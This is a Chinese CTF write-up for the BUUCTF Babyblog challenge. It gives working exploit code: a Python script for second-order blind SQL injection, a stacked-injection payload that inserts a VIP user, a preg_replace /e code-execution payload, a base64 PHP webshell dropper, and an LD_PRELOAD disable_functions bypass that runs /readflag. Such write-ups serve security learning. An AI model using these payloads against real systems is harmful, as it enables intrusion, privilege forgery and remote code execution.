###Babyblog
地址：[buuctf/Babyblog](https://buuoj.cn/challenges#[ByteCTF%202019]Babyblog)
感觉是做过的最复杂的一道题了。。。
首先是扫目录得到源码，放到seay里跑了一下，发现edit.php里面有直接字符串拼接。
```php
if(isset($_POST['title']) && isset($_POST['content']) && isset($_POST['id'])){
	foreach($sql->query("select * from article where id=" . intval($_POST['id']) . ";") as $v){
		$row = $v;
	}
	if($_SESSION['id'] == $row['userid']){
		$title = addslashes($_POST['title']);
		$content = addslashes($_POST['content']);
		$sql->query("update article set title='$title',content='$content' where userid='".$_SESSION['id']."' and  title='" . $row['title'] . "';"); 
		exit("<script>alert('Edited successfully.');location.href='index.php';</script>");
	}else{
		exit("<script>alert('You do not have permission.');history.go(-1);</script>");
	}
}
```
但这里的$row['title']并不是直接post过去的，再看看它具体是什么。
```php
if(isset($_POST['title']) && isset($_POST['content'])){
	$title = addslashes($_POST['title']);
	$content = addslashes($_POST['content']);
	$sql->query("insert into article (userid,title,content) values (" . $_SESSION['id'] . ", '$title','$content');");
	exit("<script>alert('Posted successfully.');location.href='index.php';</script>");
}
```
这里是写文章的功能，使用了addslashes对传进来的参数进行了转义。看上去好像没什么问题，但实际上这个函数转义后存进数据库再取出来的还是原来的数据，所以导致了二次注入，再另外的地方访问取出来的数据即可造成攻击。这道题就是edit.php
所以先把payload写在writing.php的标题提交，然后再到edit.php把标题改掉，观察标题是否成功修改，也就是语句是否执行成功，就可以达到盲注的效果。绕过config.php的过滤可以用异或注入。直接用glzjin大佬的脚本了，其实不是很复杂。
```python
# -*- coding: utf-8 -*-
import re
import requests

# 1'^(ascii(substr((select(group_concat(schema_name)) from (information_schema.schemata)),1,1))>1)^'1

#babyblog
#article,users
#id,username,password,isvip
def main():
    get_all_databases("http://42d9d0d7-f488-4396-9f9c-0a856344c2c3.node1.buuoj.cn/")

def http_get(url, payload):
    head = {"Cookie": "PHPSESSID=29c42b504b2568d1609260a6e30d09c8"}
    result = requests.post(url + "writing.php", data={'title': "1'^(" + payload + ")^'1", 'content': 'fuhei'}, headers=head)
    result.encoding = 'utf-8'


    r2 = requests.get(url + "index.php", headers=head)


    pattern = re.compile(r'edit.php\?id=(\d+)')
    result1 = pattern.findall(r2.text)
    result = requests.post(url + "edit.php", data={'title': "fuhei", 'content': 'fuhei', "id": result1[0]},
                           headers=head)
    result.encoding = 'utf-8'


    result2 = requests.get(url + "edit.php?id=" + result1[0], headers=head)
    print(result2.text.find('ascii') == -1)


    if result2.text.find('ascii') == -1:
        return True
    else:
        return False

# 获取数据库
def get_all_databases(url):
    db_name = ""
    db_payload = "select(id) from users"
    for y in range(1, 32):
        db_name_payload = "ascii(substr((" + db_payload + "),%d,1))" % (
            y)
        db_name += chr(half(url, db_name_payload))
        print(db_name)
    print("值为：%s" % db_name)
 
# 二分法函数
def half(url, payload):
    low = 0
    high = 126
    # print(standard_html)
    while low <= high:
        mid = (low + high) / 2
        mid_num_payload = "%s > %d" % (payload, mid)
        # print(mid_num_payload)
        # print(mid_html)
        if http_get(url, mid_num_payload):
            low = mid + 1
        else:
            high = mid - 1
    mid_num = int((low + high + 1) / 2)
    return mid_num
    
if __name__ == '__main__':
    main()
```
注了半天表,发现有个isvip列,根据源码知道要得到一个vip账号来调用replace.php中的方法。config中链接数据库用的是pdo，默认可以执行多语句，所以通过堆叠注入insert一个vip账号进去
```
123';set @sql = CONCAT("in","sert into users(id,username,password,isvip) values (10,'123','202cb962ac59075b964b07152d234b70',1);");prepare stmt from @sql; EXECUTE stmt;-- asd
```
账号密码123登录进去，利用的是源码中preg_replace函数的\e参数导致的命令执行(https://xz.aliyun.com/t/2557)，还是直接看大佬的脚本，不够感觉直接用burp方便些。
```python
import requests
import base64

cookie={
    "PHPSESSID":"ffdfcfca1ca086874bc7a9540e6a280c"
}
def write():
    url="http://003cd82a-2232-4f7c-ab80-15eafa1ed3f0.node1.buuoj.cn/edit.php"
    data={
        "title":"glzjin",
        "content":'glzjin',
        "id":"3"
    }
    r=requests.post(url=url,data=data,cookies=cookie)
    return r.content

url = "http://003cd82a-2232-4f7c-ab80-15eafa1ed3f0.node1.buuoj.cn/replace.php"

command = """eval("var_dump(scandir('/tmp'));")"""

payload = "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"regex\"\r\n\r\n1\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"find\"\r\n\r\nglzjin/e\x00\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\nglzjin\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"replace\"\r\n\r\n" +  command +"\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n3\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
headers = {
    'content-type': "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
    'Cookie': "PHPSESSID=ffdfcfca1ca086874bc7a9540e6a280c",
    'cache-control': "no-cache",
    }
write()
response = requests.request("POST", url, data=payload, headers=headers)

print(response.text)
```
尝试执行系统命令失败了，可以调个phpinfo看下。要绕open_basedir和disable_function。所以需要传so文件上去，上传文件开始想用copy('http://vpsip/exp.so','/tmp/exp.so')，但好像题目服务器外连不上。比较省事的是写个小马，然后交给蚁剑。利用base64加包含防止拦截。
```php
command = """eval("file_put_contents('1.php','PD9waHAgZXZhbCgkX1BPU1RbJ2FudCddKTs=');")"""
command = """eval("file_put_contents('2.php','<?php include(\\\'php://filter/convert.base64-decode/resource=1.php\\\');');")"""
或者直接不写右括号
file_put_contents('/var/www/html/webshell.php','<?php eval($_POST[a]);')
```
最后一步就是绕disable_function,利用LD_PRELOAD绕过https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD，把编译的exp.so用蚁剑上传，就可以执行命令，列根目录发现有readflag方法。最后payload
```
command =  """eval('$cmd = "/readflag ";$out_path = "/tmp/saj";$evil_cmdline = $cmd . " > " . $out_path . " 2>&1";putenv("EVIL_CMDLINE=" . $evil_cmdline);$so_path = "/tmp/exp.so";putenv("LD_PRELOAD=" . $so_path);error_log("", 1, "example@example.com");echo nl2br(file_get_contents($out_path)); unlink($out_path);')"""
```
绕basedir还可以用这段(用https://tool.lu/php/压缩成一行)
```php
eval('if($a=opendir("glob:///*")){while(($b=readdir($a))!==false){echo"$b\n";}closedir($a);}')
//如果有包括带.开头的用底下这个
$a=array();$b=new DirectoryIterator("glob:///*");foreach($b as $c){$a[]=$c->__toString();}$b=new DirectoryIterator("glob:///.*");foreach($b as $c){$a[]=$c->__toString();}sort($a);foreach($a as $c){echo"{$c}\n";}
}
```
也可以用打php-fpm来绕过openbase_dir和disable_function,参考https://www.cnblogs.com/wfzWebSecuity/p/11527392.html
